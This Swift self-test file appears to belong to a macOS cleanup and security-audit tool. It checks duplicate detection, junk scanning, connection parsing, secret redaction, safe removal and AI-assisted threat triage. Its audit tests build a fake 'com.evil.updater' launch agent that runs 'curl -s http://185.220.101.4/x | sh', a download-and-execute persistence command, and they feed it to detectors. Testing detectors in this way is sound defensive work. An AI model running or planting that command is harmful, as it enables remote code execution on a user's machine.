import Foundation

/// Headless checks: `BigMac --selftest <fixture-dir> [--jev] [--bedrock]`.
/// Only writes inside the fixture dir; scans of the real home folder are read-only.
enum SelfTest {
    static func run(arguments: [String]) async -> Never {
        var failures = 0
        func check(_ ok: Bool, _ label: String) {
            print(ok ? "  ✓ \(label)" : "  ✗ \(label)")
            if !ok { failures += 1 }
        }

        let dirArg = arguments.firstIndex(of: "--selftest").flatMap { i in arguments.indices.contains(i + 1) ? arguments[i + 1] : nil }
        let dir = URL(filePath: dirArg ?? NSTemporaryDirectory()).appending(path: "bigmac-fixture")
        try? FileManager.default.removeItem(at: dir)
        try! FileManager.default.createDirectory(at: dir.appending(path: "sub"), withIntermediateDirectories: true)

        print("Duplicates (fixture: \(dir.path))")
        let blob = Data((0..<(2 * 1024 * 1024)).map { _ in UInt8.random(in: 0...255) })
        var other = blob; other[other.count - 1] ^= 0xFF  // same size + same first 64 KB, different content
        try! blob.write(to: dir.appending(path: "a.bin"))
        try! blob.write(to: dir.appending(path: "sub/b.bin"))
        try! other.write(to: dir.appending(path: "c.bin"))
        try! FileManager.default.linkItem(at: dir.appending(path: "a.bin"), to: dir.appending(path: "hardlink.bin"))
        try! FileManager.default.createSymbolicLink(at: dir.appending(path: "link.bin"), withDestinationURL: dir.appending(path: "a.bin"))
        let groups = DuplicateFinder.find(roots: [dir], minSize: 1024)
        check(groups.count == 1, "one duplicate group (got \(groups.count))")
        check(groups.first?.files.count == 2, "group has 2 files after hardlink/symlink collapse (got \(groups.first?.files.map(\.lastPathComponent) ?? []))")
        check(!(groups.first?.files.contains { $0.lastPathComponent == "c.bin" } ?? true), "near-identical c.bin excluded")

        print("Sizes & protection")
        let (size, _) = FS.allocatedSize(of: dir)
        check(size >= 3 * 2 * 1024 * 1024, "fixture size \(size.bytes)")
        check(FS.isProtected(URL(filePath: "/System/Library")), "/System protected")
        check(FS.isProtected(URL(filePath: "/Applications/Foo.app/Contents/MacOS/foo")), "inside .app protected")
        check(FS.isProtected(FS.home), "home itself protected")
        check(!FS.isProtected(FS.home.appending(path: "Library/Caches/com.example")), "cache item not protected")
        var trashedURL: NSURL?
        try? FileManager.default.trashItem(at: dir.appending(path: "c.bin"), resultingItemURL: &trashedURL)
        let inTrash = (trashedURL as URL?).map { FS.trash([($0, 0)]) }
        check(inTrash?.trashed.count == 1 && !FileManager.default.fileExists(atPath: (trashedURL as URL?)?.path ?? "/"),
              "item already in Trash is deleted permanently (fixture cleaned up)")
        check(FS.trash([(URL(filePath: "/System/Library"), 0)]).failures.count == 1, "trash refuses protected path")

        print("Junk scan (read-only)")
        let logs = JunkScanner.scan(.logs)
        check(!logs.items.contains { $0.url.lastPathComponent == "DiagnosticReports" }, "DiagnosticReports folder not double-counted in Logs")
        for category in [JunkCategory.userCaches, .logs, .developer, .packageCaches, .trash, .oldDownloads] {
            let r = JunkScanner.scan(category)
            print("    \(category.title): \(r.items.count) items, \(r.total.bytes)\(r.denied ? " (some folders denied — needs Full Disk Access)" : "")")
        }

        print("New scanners")
        check(DockerScanner.parseSize("1.2GB (virtual 3GB)") == 1_200_000_000 && DockerScanner.parseSize("12.3kB") == 12_300, "docker size parsing")
        check(OrphanScanner.bundleID(from: "com.foo.bar.plist") == "com.foo.bar" && OrphanScanner.bundleID(from: "Google") == nil, "bundle id detection")
        check(OrphanScanner.isOwned("com.foo.app.helper", installed: ["com.foo.app"]) && !OrphanScanner.isOwned("com.gone.app", installed: ["com.foo.app"]),
              "helper of installed app is owned, unknown id is orphan")
        let shotDir = dir.appending(path: "shots")
        try! FileManager.default.createDirectory(at: shotDir, withIntermediateDirectories: true)
        print("    screenshot location: \(FS.tildePath(ScreenshotScanner.location))")
        let shots = ScreenshotScanner.scan()
        print("    screenshots: \(shots.items.count) items, \(shots.total.bytes)\(shots.denied ? " (denied)" : "")")
        let orphans = OrphanScanner.scan()
        print("    orphaned app data: \(orphans.items.count) items, \(orphans.total.bytes) · \(orphans.note ?? "")")
        for o in orphans.items.prefix(5) { print("      \(FS.tildePath(o.url)) \(o.size.bytes) — \(o.detail ?? "")") }
        let dbs = DatabaseScanner.scan()
        print("    databases: \(dbs.items.map { "\($0.displayPath) \($0.detail ?? "")" }) \(dbs.note ?? "")")
        print("    docker: \(DockerScanner.scan().note ?? "ok")")

        print("Apps (read-only)")
        let apps = AppScanner.scan()
        check(!apps.isEmpty, "\(apps.count) apps found, \(apps.filter { $0.lastUsed != nil }.count) with Spotlight last-used dates")

        print("Network")
        let sample = "p123\ncSafari\nf10\nPTCP\nn192.168.1.5:50000->17.253.144.10:443\nTST=ESTABLISHED\nf11\nPTCP\nn*:8080\nTST=LISTEN\nf12\nPUDP\nn[fe80::1]:5353->[2a00:1450::1]:443\np9\ncminer\nf3\nPTCP\nn10.0.0.2:1->127.0.0.1:9000\n"
        let parsed = Lsof.parse(sample)
        check(parsed.count == 2, "parser keeps 2 remote sockets, drops LISTEN + loopback (got \(parsed.count))")
        check(parsed.contains { $0.remoteHost == "2a00:1450::1" && $0.remotePort == 443 }, "IPv6 remote parsed")
        let live = (try? Lsof.connections()) ?? []
        check(!live.isEmpty, "live lsof: \(live.count) connections")
        let cache = SignatureCache()
        check(await cache.signer(for: "/usr/bin/curl") == .apple, "curl is Apple-signed")
        var rows: [ConnectionRow] = []
        for c in live.prefix(200) {
            let path = Lsof.executablePath(pid: c.pid)
            let signer = path != nil ? await cache.signer(for: path!) : .unknown
            rows.append(ConnectionRow(connection: c, exePath: path, signer: signer,
                                      signals: RiskSignal.evaluate(c, exePath: path, signer: signer), firstSeen: Date()))
        }
        for row in rows.sorted(by: { $0.level > $1.level }).prefix(8) {
            print("    [\(row.level.label)] \(row.connection.command) → \(row.connection.remote) · \(row.signer.label) · \(row.signals.map(\.rawValue))")
        }

        print("Security audit")
        let agent = dir.appending(path: "com.evil.updater.plist")
        let plist: [String: Any] = ["Label": "com.evil.updater", "ProgramArguments": ["/bin/sh", "-c", "curl -s http://185.220.101.4/x | sh"], "RunAtLoad": true]
        try! PropertyListSerialization.data(fromPropertyList: plist, format: .xml, options: 0).write(to: agent)
        let item = HostAudit.parseLaunchPlist(agent)
        check(item?.label == "com.evil.updater" && item?.program == "/bin/sh" && item?.runAtLoad == true, "launch plist parsed")
        let cmdSignals = HostAudit.commandSignals(item?.arguments.joined(separator: " ") ?? "")
        check(cmdSignals.contains("pipes a download into a shell") && cmdSignals.contains("talks to a raw IP URL"), "curl|sh launch command flagged (\(cmdSignals))")
        check(HostAudit.commandSignals("export PATH=/opt/homebrew/bin:$PATH").isEmpty, "normal rc line not flagged")
        let ps = HostAudit.parsePS("    1     0 root /sbin/launchd\n  420   1 me   /Applications/My App.app/Contents/MacOS/My App\n")
        check(ps.count == 2 && ps[1].command.hasSuffix("My App") && ps[1].pid == 420, "ps parser keeps paths with spaces")
        check(HostAudit.matchesRemoteTool("AnyDesk.app") == "anydesk" && HostAudit.matchesRemoteTool("TeamViewer_Desktop") == "teamviewer"
              && HostAudit.matchesRemoteTool("Safari.app") == nil, "remote-access tool matching")
        let secret = "run --token=abc123 AKIAABCDEFGHIJKLMNOP Bearer eyJhbGciOi password=hunter2 https://bob:pw@x.io \(FS.home.path)/x"
        let scrubbed = Redact.scrub(secret)
        check(!["abc123", "AKIAABCDEFGHIJKLMNOP", "eyJhbGciOi", "hunter2", "bob:pw", FS.home.path].contains(where: scrubbed.contains), "redaction: \(scrubbed)")
        let positional = Redact.scrub("curl -u admin:hunter2 -H 'Authorization: Basic YWRtaW46aHVudGVyMg==' x; mysql -phunter3 db; sshpass -p hunter4 ssh h; bot123456789:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
        check(!["hunter2", "YWRtaW46aHVudGVyMg", "hunter3", "hunter4", "AAAAAAAAAAAAAAAAAAAA"].contains(where: positional.contains), "redaction of positional credentials: \(positional)")
        let late = Redact.scrub(String(repeating: "x ", count: 140) + "token=" + String(repeating: "Z", count: 60))
        check(!late.contains("ZZZZ"), "secret near the 300-char edge is scrubbed before truncation")
        check(AppScanner.leftoverCandidates(bundleID: "../../Documents", name: "..").isEmpty, "bundle id / name traversal never escapes ~/Library")
        check(Removal.exactProgramPattern("/x|.").contains("\\|\\."), "pkill pattern escapes regex metacharacters")
        let lnkRoot = FileManager.default.temporaryDirectory.appending(path: "bigmac-lnk-\(getpid())")
        try? FileManager.default.createSymbolicLink(at: lnkRoot, withDestinationURL: URL(filePath: "/Library"))
        check(!Removal.isSafe(lnkRoot.appending(path: "LaunchDaemons")), "removal refuses a target behind a symlinked parent")
        try? FileManager.default.removeItem(at: lnkRoot)
        check(!Removal.isSafe(URL(filePath: "/Library/LaunchDaemons")) && !Removal.isSafe(URL(filePath: "/Library/Keychains")), "removal refuses direct /Library subfolders")
        check(Removal.isSafe(URL(filePath: "/private/etc/sudoers.d/battery")) || !FileManager.default.fileExists(atPath: "/private/etc/sudoers.d/battery"), "sudoers rule still removable")
        let leaky = [AuditItem(id: "persistence:cron:* * * * * curl --token=SECRET123 \(FS.home.path)/x", kind: .persistence, title: "crontab entry",
                               evidence: ["* * * * * curl --token=SECRET123 \(FS.home.path)/x"]),
                     AuditItem(id: "process:\(FS.home.path)/bin/tool", kind: .process, title: "tool", evidence: ["executable: \(FS.home.path)/bin/tool"])]
        let sent = AuditTriage.payload(leaky)
        check(!sent.contains("SECRET123") && !sent.contains(FS.home.path), "Bedrock payload has no secrets or home path (ids are opaque)")
        let mapped = AuditTriage.parse(["findings": [["id": "i1", "verdict": "benign", "severity": "low", "at_risk": "nothing", "rationale": "r", "action": "a"],
                                                       ["id": "i9", "verdict": "confirmed", "severity": "high", "at_risk": "x", "rationale": "r", "action": "a"]]],
                                        ids: leaky.map(\.id))
        check(mapped.count == 1 && mapped[leaky[1].id]?.severity == RiskLevel.none, "opaque ids map back; unknown ids dropped; benign forces severity none")
        let samples = ThreatIntel.enrich([
            AuditItem(id: "a", kind: .persistence, title: "com.apple.updater", evidence: ["plist: ~/Library/LaunchAgents/x.plist", "label: com.apple.updater",
                      "runs: /tmp/.u/agent", "signer: unsigned"], path: URL(filePath: "/Users/me/Library/LaunchAgents/x.plist")),
            AuditItem(id: "b", kind: .interception, title: "Trusted root: Wajam Internal CA", evidence: ["domain: admin"]),
            AuditItem(id: "c", kind: .persistence, title: "com.apple.Safari.helper", evidence: ["label: com.apple.Safari.helper", "runs: /usr/libexec/x", "signer: Apple"],
                      path: URL(filePath: "/Users/me/Library/LaunchAgents/c.plist"), routine: true),
            AuditItem(id: "d", kind: .persistence, title: "~/.zshrc line 4", evidence: ["alias sudo='~/.s/sudo'"]),
        ])
        let techniques = samples.map { $0.signals.filter { $0.hasPrefix("known technique:") }.count }
        check(techniques[0] >= 2 && samples[0].severity == .high, "Apple-impersonating agent from /tmp matches known techniques (\(techniques[0]))")
        check(samples[1].severity == .high && samples[1].signals.contains { $0.contains("T1553.004") }, "known adware root CA flagged")
        check(techniques[2] == 0 && samples[2].routine, "real Apple-signed agent untouched")
        check(samples[3].signals.contains { $0.contains("T1056.001") }, "aliased sudo flagged")

        let vendor = dir.appending(path: "co.example.widget")
        try? FileManager.default.createDirectory(at: vendor, withIntermediateDirectories: true)
        FileManager.default.createFile(atPath: vendor.appending(path: "widget").path, contents: Data("#!/bin/sh".utf8))
        let widget = dir.appending(path: "widget.plist")
        try! PropertyListSerialization.data(fromPropertyList: ["Label": "com.example.widget", "ProgramArguments": [vendor.appending(path: "widget").path, "run"]],
                                            format: .xml, options: 0).write(to: widget)
        let wplan = Removal.plan(plist: widget)
        check(wplan?.targets.map(\.url.lastPathComponent) == ["widget.plist", "co.example.widget"], "removal plan takes the plist and the tool's own folder")
        let shPlan = Removal.plan(plist: agent)
        check(shPlan?.targets.count == 1, "removal never offers /bin/sh or other system files")
        let battery = FS.home.appending(path: "Library/LaunchAgents/battery.plist")
        if let bplan = Removal.plan(plist: battery) {
            print("    removal plan for \(bplan.label) (dry run): first \(bplan.preflight?.why ?? "nothing")")
            for t in bplan.targets { print("      \(t.selected ? "[x]" : "[ ]") \(FS.tildePath(t.url)) — \(t.why)\(t.needsAdmin ? " (admin)" : "")") }
        }

        let started = Date()
        let report = await HostAudit.run()
        let flagged = report.observations.filter { $0.severity > .none }
        print("    \(report.observations.count) observations, \(flagged.count) flagged, \(AuditTriage.candidates(report.observations).count) for Haiku, \(String(format: "%.1f", Date().timeIntervalSince(started)))s")
        for o in flagged.sorted(by: { $0.severity > $1.severity }).prefix(12) {
            print("      [\(o.severity.label)] \(o.kind.rawValue): \(o.title) — \(o.signals.prefix(2).joined(separator: "; "))")
        }
        for n in report.notes { print("      note: \(n)") }

        if arguments.contains("--audit-live") {
            print("Live Haiku triage")
            let items = AuditTriage.candidates(report.observations)
            let outcome = AuditTriage.triage(items, client: BedrockClient())
            let (v, usage, skipped) = (outcome.verdicts, outcome.usage, outcome.skipped)
            for e in outcome.errors { print("    batch error: \(e)") }
            for o in items.sorted(by: { (v[$0.id]?.severity ?? .none) > (v[$1.id]?.severity ?? .none) }) {
                guard let x = v[o.id] else { print("    MISSING \(o.id)"); continue }
                print("    [\(x.severity.label) \(x.call.rawValue)] \(o.title): \(x.rationale.prefix(160)) → \(x.action.prefix(140))")
            }
            print("    judged \(v.count)/\(items.count), skipped \(skipped), tokens \(usage.input)/\(usage.output)")
            check(v.count == items.count, "every candidate got a verdict")
        }

        if arguments.contains("--bedrock") {
            print("Bedrock (\(BedrockClient().model))")
            let fake = AuditItem(id: "persistence:~/Library/LaunchAgents/com.evil.updater.plist", kind: .persistence, title: "com.evil.updater",
                                   evidence: ["plist: ~/Library/LaunchAgents/com.evil.updater.plist", "runs: /bin/sh -c curl -s http://185.220.101.4/x | sh",
                                              "signer: Apple (that is /bin/sh itself; the payload is downloaded)", "starts at login/boot", "created 2 hours ago"],
                                   signals: cmdSignals + ["runs an interpreter (sh)", "installed in the last 7 days"], severity: .high)
            let zoom = AuditItem(id: "persistence:/Library/LaunchDaemons/us.zoom.ZoomDaemon.plist", kind: .persistence, title: "us.zoom.ZoomDaemon",
                                   evidence: ["plist: /Library/LaunchDaemons/us.zoom.ZoomDaemon.plist", "runs: /Library/PrivilegedHelperTools/us.zoom.ZoomDaemon",
                                              "signer: Developer (BJ4HAAB9B3)", "starts at login/boot and is kept alive"])
            do {
                let outcome = AuditTriage.triage([fake, zoom], client: BedrockClient())
                if let e = outcome.errors.first { throw AWSError(message: e) }
                let (v, usage) = (outcome.verdicts, outcome.usage)
                for o in [fake, zoom] { print("    \(o.title): \(v[o.id].map { "\($0.call.rawValue)/\($0.severity.label) — \($0.rationale)" } ?? "missing")") }
                print("    tokens: \(usage.input) in / \(usage.output) out")
                check(v[fake.id].map { $0.call != .benign && $0.severity >= .medium } ?? false, "Haiku flags curl|sh launch agent")
                check(v[zoom.id]?.call != .confirmed, "Haiku doesn't flag signed Zoom daemon")
            } catch {
                check(false, "Bedrock call failed: \(error.localizedDescription)")
            }
        }

        if arguments.contains("--jev") {
            print("Jev")
            let key = TypeSafeKey.resolveLocal(useKeychain: false) ?? (try? TypeSafeKey.fetchFromAWS())
            if let key {
                let client = TypeSafeClient(apiKey: key)
                let fake = ConnectionRow(
                    connection: Connection(pid: 1, command: "updater", proto: "TCP", local: "10.0.0.2:5000", remote: "185.220.101.4:4444", state: "ESTABLISHED"),
                    exePath: "/private/tmp/.x/updater", signer: .unsigned,
                    signals: [.unsigned, .tempLocation, .hiddenLocation, .unusualPort], firstSeen: Date())
                var unique = Set<String>()
                let sampleRows = [fake] + rows.filter { unique.insert($0.jevKey).inserted }.prefix(4)
                do {
                    let verdicts = try await JevJudgments.judgeConnections(sampleRows, client: client)
                    for (row, v) in zip(sampleRows, verdicts) {
                        print("    \(row.connection.command) → \(row.connection.remote): suspicion \(v.map { String(format: "%.2f", $0.value) } ?? "nil")")
                    }
                    check((verdicts.first??.value ?? 0) > 0.5, "Jev rates fake unsigned /tmp binary on :4444 as suspicious")
                    let junk = [
                        JunkItem(url: FS.home.appending(path: "Library/Caches/com.spotify.client"), category: .userCaches, size: 500_000_000),
                        JunkItem(url: FS.home.appending(path: "Library/Developer/Xcode/DerivedData/MyApp-abc"), category: .developer, size: 2_000_000_000),
                    ]
                    let jv = try await JevJudgments.judgeJunk(junk, client: client)
                    for (item, v) in zip(junk, jv) { print("    safe-to-delete \(FS.tildePath(item.url)): \(v.map { String(format: "%.2f", $0.value) } ?? "nil")") }
                    check(jv.allSatisfy { ($0?.value ?? 0) > 0.5 }, "Jev considers cache + DerivedData safe")
                } catch {
                    check(false, "Jev call failed: \(error.localizedDescription)")
                }
            } else {
                check(false, "no TypeSafe key (env or AWS)")
            }
        }

        try? FileManager.default.removeItem(at: dir)
        print(failures == 0 ? "ALL PASSED" : "\(failures) FAILED")
        exit(failures == 0 ? 0 : 1)
    }
}
